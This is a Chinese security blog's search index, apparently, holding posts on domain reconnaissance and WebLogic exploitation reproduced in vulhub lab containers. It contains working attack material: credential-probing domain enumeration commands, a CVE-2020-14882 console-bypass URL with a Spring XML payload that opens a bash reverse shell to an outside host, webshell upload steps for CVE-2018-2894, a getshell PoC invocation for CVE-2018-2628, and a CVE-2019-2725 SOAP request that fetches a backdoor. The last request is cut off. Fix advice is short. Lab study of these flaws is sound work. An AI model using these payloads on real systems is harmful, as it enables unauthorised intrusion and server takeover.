<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>域信息收集命令</title>
      <link href="/archives/397dc553.html"/>
      <url>/archives/397dc553.html</url>
      
        <content type="html"><![CDATA[<h1 id="域信息收集命令"><a href="#域信息收集命令" class="headerlink" title="域信息收集命令"></a>域信息收集命令</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">query user || qwinsta 查看当前在线用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> user 查看本机用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> user /domain 查看域用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> view &amp; <span class="built_in">net</span> group &quot;domain computers&quot; /domain 查看当前域计算机列表 第二</span><br><span class="line">个查的更多</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> view /domain 查看有几个域</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> view \\\\dc 查看 dc 域内共享文件</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> group /domain 查看域里面的组</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain 查看域管</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup administrators /domain /这个也是查域管，是升级为域控时，</span><br><span class="line">本地账户也成为域管</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain 域控</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> config workstation 当前登录域 - 计算机名 - 用户名</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> use \\\\域控(如 pc.xx.com) password /user:xxx.com\username 相当于这个</span><br><span class="line">帐号登录域内主机，可访问资源</span><br><span class="line"></span><br><span class="line"><span class="built_in">ipconfig</span></span><br><span class="line"></span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">tasklist /svc</span><br><span class="line"></span><br><span class="line">tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组</span><br><span class="line"></span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">nltest /dclist:xx 查看域控</span><br><span class="line"></span><br><span class="line">whoami /all 查看 Mandatory <span class="built_in">Label</span> uac 级别和 sid 号</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> sessoin 查看远程连接 session (需要管理权限)</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> share 共享目录</span><br><span class="line"></span><br><span class="line">cmdkey /l 查看保存登陆凭证</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%logonserver%</span> 查看登陆域</span><br><span class="line"></span><br><span class="line">spn –l administrator spn 记录</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> 环境变量</span><br><span class="line"></span><br><span class="line">dsquery server - 查找目录中的 AD DC/LDS 实例</span><br><span class="line"></span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line"></span><br><span class="line">dsquery computer 查询所有计算机名称 windows <span class="number">2003</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> /s *.exe 查找指定目录下及子目录下没隐藏文件</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">arp -a 查询当前环境</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/15/sdb1cn.png" alt="0"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user /domain 查询当前域用户</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/15/sdtrbo.png" alt="1"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> 查询 域控</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/15/sf2han.png" alt="2"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> group /domain 查询域工作组</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/15/selqq2.png" alt="3"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain 查询域管理用户</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/15/sg3lv9.png" alt="4"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> group &quot;Domain controllers&quot;查询有几台域控制器 需要域权限</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/15/sgdval.png" alt="5"></p><h1 id="查找域服务器"><a href="#查找域服务器" class="headerlink" title="查找域服务器"></a>查找域服务器</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> 查询时间 这个命令会请求域服务器的时间</span><br><span class="line"><span class="built_in">net</span> config workstation 查看当前工作环境</span><br><span class="line">nltest /dclist:域名 查询域控</span><br><span class="line"><span class="built_in">ping</span>/nslookup 查找域控</span><br></pre></td></tr></table></figure><h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p>在域内进行横行渗透时，首先要收集主机的端口和 ip 信息</p><p>net view &#x2F;domain 查询域内的主机信息</p><p>发生系统错误 6118 出现这种错误时<strong>Computer Browser</strong>被禁用了,  在域管理启用即可<br><img src="https://pic.888888.al/i/2023/03/15/sjpglt.png" alt="6"></p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">arp -a 查询通信</span><br><span class="line"></span><br><span class="line">nbtscan.exe -r <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">0</span>/<span class="number">24</span> 发现主机</span><br></pre></td></tr></table></figure><h2 id="基于-MSF-的内网主机探测"><a href="#基于-MSF-的内网主机探测" class="headerlink" title="基于 MSF 的内网主机探测"></a>基于 MSF 的内网主机探测</h2><p>使用 msf 进行反弹 shell 进行内网渗透时，通过 msf 自带的扫描模块进行快速扫<br>描。</p><p>主机存活探测：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep ARP 扫描</span><br><span class="line">auxiliary/scanner/discovery/udp_sweep UDP 扫描</span><br><span class="line">auxiliary/scanner/netbios/nbname NETBIOS 扫描</span><br><span class="line">auxiliary/scanner/snmp/snmp_enum SNMP 扫描</span><br><span class="line">auxiliary/scanner/smb/smb_version SMB 扫描</span><br><span class="line">端口扫描：</span><br><span class="line">auxiliary/scanner/portscan/ack TCP ACK 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/ftpbounce FTP bounce 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/syn SYN 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/tcp TCP 端口扫描</span><br><span class="line">auxiliary/scanner/portscan/xmas TCP XMas 端口扫描</span><br></pre></td></tr></table></figure><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Nmap 是一个端口扫描器，可用于主机发现、端口扫描、版本检测、OS 检测等。</p><p>使用场景：建立 socks 代理，proxychains+Nmap 扫描内网。</p><p>支持多种扫描模式：</p><p>-sT: TCP 扫描</p><p>-sS: SYN 扫描</p><p>-sA: ACK 扫描</p><p>-sF：FIN 扫描</p><p>-sU: UDP 扫描</p><p>-sR: RPC 扫描</p><p>-sP: ICMP 扫描</p><p>快速扫描所有端口：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sS -p <span class="number">1</span>-<span class="number">65535</span> -v <span class="number">192</span>.<span class="number">168</span>.<span class="number">99</span>.<span class="number">177</span></span><br></pre></td></tr></table></figure><h1 id="常见的端口与服务"><a href="#常见的端口与服务" class="headerlink" title="常见的端口与服务"></a>常见的端口与服务</h1><table><thead><tr><th>端口号</th><th>端口说明</th><th>攻击技巧</th></tr></thead><tbody><tr><td>21&#x2F;22&#x2F;69</td><td>ftp&#x2F;tftp：文件传输协议</td><td>爆破\嗅探\溢出\后门</td></tr><tr><td>22</td><td>ssh：远程连接</td><td>爆破 OpenSSH；28个退格</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破\嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS：域名系统</td><td>DNS 区域传输\DNS 劫持\DNS 缓存投毒\DNS欺骗\利用 DNS 隧道技术刺透防火墙</td></tr><tr><td>67&#x2F;68</td><td>dhcp</td><td>劫持\欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破</td></tr><tr><td>139</td><td>samba</td><td>爆破\未授权访问\远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>爆破</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ldap</td><td>注入攻击\未授权访问</td></tr><tr><td>445</td><td>SMB</td><td>远程代码执行</td></tr><tr><td>512&#x2F;513&#x2F;514</td><td>linux r</td><td>直接使用 rlogin</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破：进行内网渗透</td></tr><tr><td>1352</td><td>lotus</td><td>爆破：弱口令\信息泄漏：源代码</td></tr><tr><td>1433</td><td>mssql</td><td>爆破：使用系统用户登录\注入攻击</td></tr><tr><td>1521</td><td>oracle</td><td>爆破：TNS\注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破\拒绝服务\注入</td></tr><tr><td>3389</td><td>rdp</td><td>爆破\Shift 后门</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破：控制台弱口令\认证绕过</td></tr><tr><td>5000</td><td>sybase&#x2F;DB2</td><td>爆破\注入</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出\注入攻击\爆破：弱口令</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务\代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破：弱口令\认证绕过</td></tr><tr><td>6379</td><td>redis</td><td>未授权访问\爆破：弱口令</td></tr><tr><td>7001</td><td>weblogic Java</td><td>反序列化\控制台弱口令\控制台部署webshell</td></tr><tr><td>80&#x2F;443&#x2F;8080</td><td>web</td><td>常见 web 攻击\控制台爆破\对应服务器版本漏洞</td></tr><tr><td>8069</td><td>zabbix</td><td>远程命令执行</td></tr><tr><td>9080</td><td>websphere</td><td>远程命令执行</td></tr><tr><td>9090</td><td>websphere</td><td>控制台 爆破：控制台弱口令\Java 反序列</td></tr><tr><td>9200&#x2F;9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破\未授权访问</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网基础知识</title>
      <link href="/archives/2bfd09c1.html"/>
      <url>/archives/2bfd09c1.html</url>
      
        <content type="html"><![CDATA[<h1 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h1><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p>工作组:工作组是局域网中的一个概念，他是长久的资源管理模式。默认情况下使用工作组方式进行资源管理，将不同的 computer 按照不同的要求分类到不同的组。<br><img src="https://pic.888888.al/i/2023/03/15/rfwbig.png" alt="0"></p><p><strong>域:</strong> 用来描述一种架构，和“工作组”相对应，由工作组升级而来的高级架构，域<br>(Domain)是一个有安全边界的计算机集合（ 安全边界，意思是在两个域中，一个<br>域中的用户无法访问另一个域中的资源）。可以简单的把域理解成升级版的“工作<br>组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域<br>内的资源，就必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什<br>么样的权限,还需要取决于你在该域中的用户身份。</p><h2 id="域的几种环境"><a href="#域的几种环境" class="headerlink" title="域的几种环境"></a>域的几种环境</h2><h3 id="•-单域"><a href="#•-单域" class="headerlink" title="• 单域"></a>• 单域</h3><p>通常一个小公司，一般一个域就可以，一个域内，要至少两台域服务器，一<br>台作为域控制器，另一台当备份。<br>活动目录的数据库【包括用户的账号信息】是存储在域控制器中，若没备<br>份，瘫痪了不能正常使用了！<br>父域和子域<br>出于管理及其他需求，需要在网络中划分多个域。第一个域称为父域，其他为子<br>域</p><h3 id="•-域树"><a href="#•-域树" class="headerlink" title="• 域树"></a>• 域树</h3><p><img src="https://pic.888888.al/i/2023/03/15/s4h76w.png" alt="1"></p><h3 id="•-域森林"><a href="#•-域森林" class="headerlink" title="• 域森林"></a>• 域森林</h3><p>指的是多个域树通过建立信任关系组成的集合</p><p>比如：一个公司并购其他公司<br><img src="https://pic.888888.al/i/2023/03/15/s51kde.png" alt="2"></p><h2 id="域名服务器-DNS"><a href="#域名服务器-DNS" class="headerlink" title="域名服务器 DNS"></a>域名服务器 DNS</h2><p>是指用于实现域名和与之相对应的 IP 地址转换的服务器。从对域树的介绍中来看<br>出，域树中的域名和 DNS 域名非常相似。而实际上，因为域名的计算机是使用<br>DNS 来定位域控制器、服务器及其他计算机、网络服务的，所以域的名字就是<br>DNS 域的名字。</p><p>在内网渗透测试中，大都是通过寻找 DNS 服务器来确定域控制器的位置的{DNS<br>服务器和域控制器通常配置在同一台机器上}</p><h2 id="域术语"><a href="#域术语" class="headerlink" title="域术语"></a>域术语</h2><p>DC:域控，域的创建者</p><p>域管理:域控上的管理员</p><p>AD 活得目录:Active Directory</p><p>NTDS.dit:域用户帐户以域数据库的形式保存在活动目录中</p><p>Ntdsutil.exe-ntdsutil.exe 是域控制器自带的域数据库管理工具，从 windows<br>Server 2008 开始就默认自带了。因此我们可以通过 ntdsutil.exe 提取出域中所有<br>的域用户信息。</p><p>常见结构:组织单元(OU)、域(DOMAIN)、域树(tree)、域森林(forest)，在域树内的<br>所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一<br>个域只存储该域内的数据<br>活动目录:</p><ul><li><p>帐号集中管理：所有帐号均存在服务器上，方便对帐号的重命名&#x2F;重置密码。</p></li><li><p>软件集中管理：统一推送软件，统一安装网络打印机等。利用软件发布策略分发<br>软件,可以让用户自由选择安装软件。</p></li><li><p>环境集中管理：利用 AD 可以统一客户端桌面，IE，TCP&#x2F;IP 等设置。</p></li><li><p>增强安全性：统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统<br>一制订用户密码策略等，可监控网络，资料统一管理。</p></li><li><p>更可靠：更少的宕机时间。如：利用 AD 控制用户访问权限，利用群集、负载均<br>衡等技术对文件服务器进行容灾设定，更可靠，宕机时间更少。</p></li><li><p>活动目录为 Microsoft 统一管理的基础平台，其它 ISA、Exchange、SMS 等服务<br>都依赖于这个基础平台。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-14882 WebLogic远程代码执行漏洞</title>
      <link href="/archives/a67ffbba.html"/>
      <url>/archives/a67ffbba.html</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-14882-WebLogic远程代码执行漏洞"><a href="#CVE-2020-14882-WebLogic远程代码执行漏洞" class="headerlink" title="CVE-2020-14882 WebLogic远程代码执行漏洞"></a>CVE-2020-14882 WebLogic远程代码执行漏洞</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>2020年10月28日，Oracle发布的10月安全更新中的Oracle WebLogic Server 远程代码执行漏洞（CVE-<br>2020-14882）POC被公开，远程攻击者可以通过发送恶意的HTTP GET 请求。成功利用此漏洞的攻击者<br>可在未经身份验证的情况下控制 WebLogic Server Console ，并执行任意代码。<br>2020年10月29日, Oracle发布的漏洞补丁CVE-2020-14882存在可绕过的0day漏洞。即在Weblogic补丁<br>更新完成后，攻击者仍可绕过WebLogic后台登录等限制，并控制Weblogic服务器。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2.影响版本"></a>2.影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Oracle Weblogic Server 10.3.6.0.0</span><br><span class="line">Oracle Weblogic Server 12.1.3.0.0</span><br><span class="line">Oracle Weblogic Server 12.2.1.3.0</span><br><span class="line">Oracle Weblogic Server 12.2.1.4.0</span><br><span class="line">Oracle Weblogic Server 14.1.1.0.0</span><br></pre></td></tr></table></figure><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h2><p>首先进入CVE-2020-14882的docker环境</p><p>sudo docker-compose up -d</p><p>构造url 达到未授权登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001/console/images/%252E%252E%252Fconsole.portal?</span><br><span class="line">_nfpb=true&amp;_pageLabel=AppDeploymentsControlPage&amp;handle=com.bea.console.handles.J</span><br><span class="line">MXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/06/128665i.png" alt="0"><br>访问即可进入后台，达到未授权访问的效果</p><p>但是这里没有部署安装的按钮，也就是说不能像常规进入后台后写shell进去，这里就需要用到远程加载<br>XML文件拿shell</p><p>首先测试以下漏洞代码执行是否成功，在&#x2F;tmp&#x2F;下创建一个test文件夹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001//console/images/%252E%252E%252Fconsole.portal?</span><br><span class="line">_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSess</span><br><span class="line">ion(%22java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/test%27);%22);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it cve202014882_weblogic_1 /bin/bash</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/06/1295qqs.png" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># reverse-bash.xml</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">&lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">&lt;constructor-arg&gt;</span><br><span class="line">&lt;list&gt;</span><br><span class="line">&lt;value&gt;/bin/bash&lt;/value&gt;</span><br><span class="line">&lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">&lt;value&gt;&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/192.168.0.182/9999 0&gt;&amp;1]]&gt;&lt;/value&gt;</span><br><span class="line">&lt;/list&gt;</span><br><span class="line">&lt;/constructor-arg&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>nc开启监听端口，访问</p><p>nc -lvnp 9999</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001/console/images/%252E%252E%252Fconsole.portal?</span><br><span class="line">_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.c</span><br><span class="line">ontext.support.ClassPathXmlApplicationContext(&quot;http://192.168.0.182/reversebash.xml&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/06/129q0er.png" alt="2"></p><h2 id="4-修复方案"><a href="#4-修复方案" class="headerlink" title="4.修复方案"></a>4.修复方案</h2><p>修复建议</p><p>安装官方最新补丁进行升级：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.oracle.com/security-alerts/cpuapr2020.html</span><br></pre></td></tr></table></figure><p>临时措施：</p><p>由于该漏洞的补丁存在被绕过的风险，建议临时关闭后台&#x2F;console&#x2F;console.portal对外访问。</p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic CVE-2018-2894文件任意上传</title>
      <link href="/archives/8cb2dd9e.html"/>
      <url>/archives/8cb2dd9e.html</url>
      
        <content type="html"><![CDATA[<h1 id="WebLogic-CVE-2018-2894文件任意上传"><a href="#WebLogic-CVE-2018-2894文件任意上传" class="headerlink" title="WebLogic CVE-2018-2894文件任意上传"></a>WebLogic CVE-2018-2894文件任意上传</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，进而获取服务器权限。</p><p>Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service<br>Test Page 在 ‘生产模式’ 下默认不开启，所以该漏洞有一定限制。两个页面分别<br>为&#x2F;ws_utc&#x2F;begin.do、&#x2F;ws_utc&#x2F;config.do。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2.影响版本"></a>2.影响版本</h2><p>weblogic 10.3.6.0、weblogic 12.1.3.0、weblogic 12.2.1.2、weblogic 12.2.1.3。</p><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h2><p>打开vulhub里的docker环境</p><p>cd &#x2F;vulhub&#x2F;weblogic</p><p>sudo apt install docker-compose 没有可以先安装这个组件</p><p> sudo docker-compose up -d</p><p> <img src="https://pic.888888.al/i/2023/03/06/121hwgk.png" alt="0"><br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> http://192.168.0.159:7001/console/login/LoginForm.jsp</span><br><span class="line">获取账号和密码</span><br><span class="line">sudo docker-compose logs | grep password</span><br><span class="line">weblogic dojvLfj3</span><br></pre></td></tr></table></figure><br><img src="https://pic.888888.al/i/2023/03/06/121zdsg.png" alt="1"><br>保存 进入开发模式</p><p>开发环境下的测试页有两个，分别为 config.do 和 begin.do</p><p>首先进入 config.do 文件进行设置，将目录设置为 ws_utc 应用的静态文件css目录，访问这个目录是无<br>需权限的，这一点很重要。</p><p>来到这个页面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001/ws_utc/config.do</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/06/122aw5w.png" alt="2"></p><p>设置工作目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_intern</span><br><span class="line">al/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure><p>点击添加后上传一个jsp<br><img src="https://pic.888888.al/i/2023/03/06/122u7nj.png" alt="3"><br>提交之后点击F12审查元素得到jsp上传后的时间戳<br><img src="https://pic.888888.al/i/2023/03/06/123a1m1.png" alt="4"><br>访问路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.159:7001/ws_utc/css/config/keystore/1631163729917_shell.jsp</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/06/123rls5.png" alt="5"><br>这里我们在对 begin.do 未授权访问进行利用。访问<a href="http://192.168.0.159:7001/ws_utc/begin.do%EF%BC%8C%E4%B8%8A">http://192.168.0.159:7001/ws_utc/begin.do，上</a><br>传一个jsp<br><img src="https://pic.888888.al/i/2023/03/06/124e811.png" alt="6"><br>点击提交，这里辉显示一个error不用管它，F12进入网络，然后筛选POST方法，得到一个jsp的路径<br><img src="https://pic.888888.al/i/2023/03/06/124km4k.png" alt="7"><br>构造得到<a href="http://192.168.0.159:7001/ws_utc/css/upload/RS_Upload_2021-09-09_05-08-33_853/impo">http://192.168.0.159:7001/ws_utc/css/upload/RS_Upload_2021-09-09_05-08-33_853/impo</a><br>rt_file_name_z.jsp，冰蝎连接即可<br><img src="https://pic.888888.al/i/2023/03/06/1251hbj.png" alt="8"></p><h2 id="4-修复方案"><a href="#4-修复方案" class="headerlink" title="4.修复方案"></a>4.修复方案</h2><p><strong>1.升级 设置强口令</strong></p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic T3协议反序列化命令执行漏洞</title>
      <link href="/archives/b5c3927d.html"/>
      <url>/archives/b5c3927d.html</url>
      
        <content type="html"><![CDATA[<h1 id="WebLogic-T3协议反序列化命令执行漏洞-CVE-2018-2628"><a href="#WebLogic-T3协议反序列化命令执行漏洞-CVE-2018-2628" class="headerlink" title="WebLogic T3协议反序列化命令执行漏洞(CVE-2018-2628)"></a>WebLogic T3协议反序列化命令执行漏洞(CVE-2018-2628)</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它<br>Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中,<br>并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开<br>启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件<br>的远程代码执行攻击</p><h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><p><img src="https://pic.888888.al/i/2023/03/06/119mno7.png" alt="0"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载poc</span><br><span class="line">git clone https://github.com/jas502n/CVE-2018-2628.git</span><br><span class="line">进入CVE-2018-2628目录执行getshell命令</span><br><span class="line">python CVE-2018-2628-Getshell.py 192.168.0.159 47136 shell.jsp</span><br><span class="line">python CVE-2018-2628-Getshell.py ip port shell.jsp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/06/11a87jo.png" alt="1"><br><img src="https://pic.888888.al/i/2023/03/06/11alp8f.png" alt="2"></p><h2 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h2><p>1.及时更新补丁</p><p>2.禁用T3协议</p><p>3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源</p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wls-wsat反序列化漏洞(CVE-2019-2725)</title>
      <link href="/archives/593eaa36.html"/>
      <url>/archives/593eaa36.html</url>
      
        <content type="html"><![CDATA[<h1 id="wls-wsat反序列化漏洞-CVE-2019-2725"><a href="#wls-wsat反序列化漏洞-CVE-2019-2725" class="headerlink" title="wls-wsat反序列化漏洞(CVE-2019-2725)"></a>wls-wsat反序列化漏洞(CVE-2019-2725)</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>CVE-2019-2725是一个Oracle weblogic反序列化远程命令执行漏洞，这个漏洞依旧是根据weblogic的<br>xmldecoder反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2.影响版本"></a>2.影响版本</h2><p>weblogic 10.x</p><p>weblogic 12.1.3</p><h2 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h2><p>漏洞存在于：_async&#x2F;AsyncResponseService，访问地址可以访问则存在漏洞：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.185:7001/_async/AsyncResponseService</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/03/06/115f4lh.png" alt="0"></p><p>使用burpsuite提交poc 下载远程后门到指定目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /_async/AsyncResponseService HTTP/1.1</span><br><span class="line">Host: 192.168.0.185:7001</span><br><span class="line">Content-Length: 910</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">SOAPAction:</span><br><span class="line">Accept: */*</span><br><span class="line">User-Agent: Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line">Connection: keep-alive</span><br><span class="line">content-type: text/xml</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><br><span class="line">xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;</span><br><span class="line">xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;</span><br><span class="line">&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;</span><br><span 